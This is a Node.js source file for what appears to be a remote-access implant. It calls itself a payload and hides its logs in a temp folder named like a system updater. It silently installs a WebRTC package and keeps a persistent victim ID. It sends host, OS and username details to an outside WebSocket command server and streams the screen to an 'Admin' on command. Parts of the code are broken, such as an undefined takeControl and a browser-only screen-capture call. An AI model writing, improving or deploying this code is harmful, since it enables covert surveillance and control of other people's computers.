const WebSocket = require('ws');
const { execSync } = require('child_process');
const os = require('os');
const path = require('path');
const fs = require('fs'); 
const crypto = require('crypto');

// --- FORCE INSTALLATION CHECK ---
try {
 const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
 if (!fs.existsSync(nodeModulesPath)) {
 console.log("[FORCE] @roamhq/wrtc missing. Installing...");
 execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
 console.log("[FORCE] Installation complete.");
 }
} catch (e) {
 console.warn("[FORCE] Could not auto-install:", e.message);
}

// --- NATIVE WEBRTC IMPORTS ---
let wrtc;
try {
 wrtc = require('@roamhq/wrtc');
} catch (e) {
 console.error("Failed to require @roamhq/wrtc:", e.message);
}

const { RTCPeerConnection, RTCSessionDescription, mediaDevices } = wrtc || {};

// --- LOGGING SYSTEM ---
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

function log(msg) {
 const timestamp = new Date().toISOString();
 console.log(`[${timestamp}] ${msg}`);
 try {
 fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
 if (ws && ws.readyState === WebSocket.OPEN && myId) {
 safeSend(JSON.stringify({ type: 'system_log', message: msg }));
 }
 } catch (e) {}
}

log("[INIT] Payload starting...");

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 

let myId = null;
let ws = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;
let isConnected = false;

// Persistence Logic - STRICT ID RETENTION
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
try {
 if (fs.existsSync(PERSIST_FILE)) {
 const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
 if (savedId && savedId.length > 0) {
 myId = savedId;
 log(`[ID] Restored persistent ID: ${myId}`);
 }
 }
} catch(e) {}

if (!myId) {
 // Generate a NEW ID only if none exists
 const mac = getMacAddress();
 myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
 try {
 fs.writeFileSync(PERSIST_FILE, myId);
 log(`[ID] Generated new persistent ID: ${myId}`);
 } catch(e) {}
}

// --- WEBRTC VARIABLES ---
let peerConnection = null;
let localStream = null;
let remotePeerId = null;

// --- INIT CONNECTION ---
function initConnection() {
 log(`[WS] Attempting connection to ${WS_URL}...`);
 
 ws = new WebSocket(WS_URL);

 ws.on('open', () => {
 reconnectAttempts = 0;
 isConnected = true;
 
 log(`[WS] Connected with ID: ${myId}`);

 safeSend(JSON.stringify({
 type: 'info',
 id: myId,
 os: os.platform(),
 arch: os.arch(),
 user: os.userInfo().username,
 ip: getExternalIP(),
 version: '2.0.5'
 }));

 startMonitoring();
 });

 ws.on('message', (msg) => {
 try {
 const data = JSON.parse(msg);
 log(`[MSG] Received: ${data.type} from ${data.from || 'unknown'}`);
 
 if (data.type === 'take_control') takeControl(true);
 else if (data.type === 'release_control') takeControl(false);
 else if (data.type === 'request_join') {
 log(`[JOIN] Request join received from ${data.from}`);
 handleJoinRequest(data.from);
 } else if (data.type === 'start_join') {
 log(`[JOIN] Starting join initiated by ${data.from}`);
 handleJoinRequest(data.from);
 } else if (data.type === 'offer') {
 log(`[SIG] Received Offer from Admin`);
 handleOffer(data.sdp, data.targetId || myId);
 } else if (data.type === 'answer') {
 log(`[SIG] Received Answer from Admin`);
 handleAnswer(data.sdp);
 } else if (data.type === 'candidate') {
 log(`[SIG] Received Candidate`);
 handleCandidate(data.candidate);
 } else if (data.type === 'screen_data') {
 captureScreenPureJS();
 } else if (data.type === 'system_log') {
 // Optional
 }
 } catch (e) {
 log(`[WS] Error parsing message: ${e.message}`);
 }
 });

 ws.on('close', (code, reason) => {
 log(`[WS] Closed. Code: ${code}, Reason: ${reason.toString()}`);
 isConnected = false;
 reconnect();
 });

 ws.on('error', (err) => {
 log(`[WS] Error: ${err.message}`);
 });
}

// --- HELPERS ---
function safeSend(msg) {
 if (ws && ws.readyState === WebSocket.OPEN) {
 ws.send(msg);
 }
}

function getMacAddress() {
 const interfaces = os.networkInterfaces();
 for (const name of Object.keys(interfaces)) {
 for (const iface of interfaces[name]) {
 if (iface.family === 'IPv4' && !iface.internal) {
 return iface.mac;
 }
 }
 }
 return '00:00:00:00:00:00';
}

function getExternalIP() {
 // Simple heuristic or use a service if needed, defaulting to internal for LAN C2
 return '127.0.0.1'; 
}

function reconnect() {
 if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
 reconnectAttempts++;
 log(`[WS] Reconnecting in 5s... (Attempt ${reconnectAttempts})`);
 setTimeout(initConnection, 5000);
 } else {
 log("[WS] Max reconnections reached.");
 }
}

function startMonitoring() {
 // Heartbeat Limiter - Strictly controlled
 setInterval(() => {
 if (isConnected) {
 safeSend(JSON.stringify({ type: 'heartbeat' }));
 }
 }, 30000); // Every 30 seconds
}

async function captureScreenPureJS() {
 if (!peerConnection) return;
 try {
 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
 localStream = stream;
 
 if (!peerConnection) {
 peerConnection = new RTCPeerConnection({
 iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
 });
 }

 stream.getTracks().forEach(track => {
 peerConnection.addTrack(track, stream);
 });

 peerConnection.onicecandidate = (event) => {
 if (event.candidate) {
 safeSend(JSON.stringify({
 type: 'candidate',
 targetId: remotePeerId,
 candidate: event.candidate
 }));
 }
 };

 peerConnection.ontrack = (event) => {
 log("[WEBRTC] Remote track received");
 // In payload context, we might just log it or store it
 };

 const offer = await peerConnection.createOffer();
 await peerConnection.setLocalDescription(offer);
 safeSend(JSON.stringify({
 type: 'offer',
 targetId: 'admin',
 sdp: peerConnection.localDescription
 }));
 } catch (err) {
 log(`[WEBRTC] Screen capture error: ${err.message}`);
 }
}

function handleJoinRequest(fromAdminId) {
 log("[WEBRTC] Initiating screen share...");
 captureScreenPureJS();
}

function handleOffer(offerSDP, targetId) {
 if (!peerConnection) {
 peerConnection = new RTCPeerConnection({
 iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
 });
 }
 remotePeerId = targetId;

 peerConnection.ontrack = (event) => {
 log("[WEBRTC] Stream received from Admin");
 // Handle admin stream if needed
 };

 peerConnection.onicecandidate = (event) => {
 if (event.candidate) {
 safeSend(JSON.stringify({
 type: 'candidate',
 targetId: targetId,
 candidate: event.candidate
 }));
 }
 };

 peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
 .then(() => peerConnection.createAnswer())
 .then(answer => peerConnection.setLocalDescription(answer))
 .then(() => {
 safeSend(JSON.stringify({
 type: 'answer',
 targetId: targetId,
 sdp: peerConnection.localDescription
 }));
 log("[SIG] Answer sent to Admin");
 })
 .catch(err => log(`[WEBRTC] Error handling offer: ${err.message}`));
}

function handleAnswer(answerSDP) {
 if (peerConnection) {
 peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP))
 .then(() => log("[WEBRTC] Answer processed"))
 .catch(err => log(`[WEBRTC] Error handling answer: ${err.message}`));
 }
}

function handleCandidate(candidate) {
 if (peerConnection && candidate) {
 peerConnection.addIceCandidate(new RTCIceCandidate(candidate))
 .catch(err => log(`[WEBRTC] Error adding candidate: ${err.message}`));
 }
}

initConnection();
